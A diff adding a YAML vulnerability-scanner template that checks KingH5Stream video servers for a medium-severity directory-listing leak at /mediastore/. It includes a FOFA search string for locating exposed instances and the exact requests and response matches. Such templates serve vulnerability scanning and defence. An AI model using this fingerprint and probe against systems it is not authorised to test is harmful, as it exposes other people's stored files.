@@ -1,0 +1,19 @@
+id: poc-yaml-kingh5stream-directory-traversal
+info:
+  name: 北京亚控科技KingH5Stream 目录遍历漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: kingh5stream
+  fofa: body="kingH5stream"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"KingH5Stream")
+- method: GET
+  path: /mediastore/
+  expression: "status_code == 200 && \ncontains(body,\"Index of /mediastore/\") &&\n\
+    contains(body,\"Name\") &&\ncontains(body,\"Modified\") &&\ncontains(body,\"Parent\
+    \ directory\")\n"
+variables: {}
+transport: http
